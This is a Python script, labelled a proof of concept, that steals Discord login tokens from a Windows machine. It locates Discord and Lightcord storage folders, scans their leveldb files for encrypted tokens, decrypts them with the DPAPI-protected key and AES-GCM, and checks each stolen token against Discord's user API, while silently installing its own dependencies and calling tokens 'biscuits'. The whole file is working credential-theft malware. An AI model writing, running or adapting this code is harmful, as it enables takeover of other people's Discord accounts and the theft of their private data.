import os
import re
import json
import base64
import urllib.request
import subprocess
import sys
import datetime

from typing import List

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

class PocInfo:
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
    }

    @classmethod
    def get_headers(cls, biscuit=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        if biscuit:
            headers["Authorization"] = biscuit
        return headers

    @classmethod
    def get_biscuits(cls, path: str) -> List[str]:
        path += "\\Local Storage\\leveldb\\"
        if not os.path.exists(path):
            return []

        biscuits = []
        for file in os.listdir(path):
            if not file.endswith(".ldb") and not file.endswith(".log"):
                continue
            try:
                with open(os.path.join(path, file), "r", errors="ignore") as f:
                    lines = f.readlines()
                    for line in lines:
                        for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            biscuits.append(match)
            except PermissionError:
                continue
        return biscuits

    @classmethod
    def get_key(cls, path: str) -> bytes:
        with open(path + "\\Local State", "r") as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    @classmethod
    def decrypt_biscuit(cls, encrypted_biscuit: str, key: bytes) -> str:
        try:
            decoded = base64.b64decode(encrypted_biscuit.split("dQw4w9WgXcQ:")[1])
            nonce, ciphertext = decoded[3:15], decoded[15:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt(ciphertext)[:-16].decode()
        except Exception:
            return ""

    @classmethod
    def get_user_info(cls, biscuit: str) -> dict:
        req = urllib.request.Request(
            'https://discord.com/api/v10/users/@me',
            headers=cls.get_headers(biscuit)
        )
        try:
            with urllib.request.urlopen(req) as response:
                return json.loads(response.read().decode())
        except:
            return {}

    @classmethod
    def colorize_biscuit(cls) -> List[dict]:
        biscuits_found = []
        for platform, path in cls.PATHS.items():
            if not os.path.exists(path):
                continue

            try:
                key = cls.get_key(path)
                raw_biscuits = cls.get_biscuits(path)
                for raw_biscuit in raw_biscuits:
                    biscuit = cls.decrypt_biscuit(raw_biscuit, key)
                    if biscuit and biscuit not in biscuits_found:
                        biscuits_found.append(biscuit)
                        user_info = cls.get_user_info(biscuit)
            except Exception as e:
                print(f"[{platform}] Error: {e}")
        return biscuits_found

if __name__ == "__main__":
    PocInfo.colorize_biscuit()
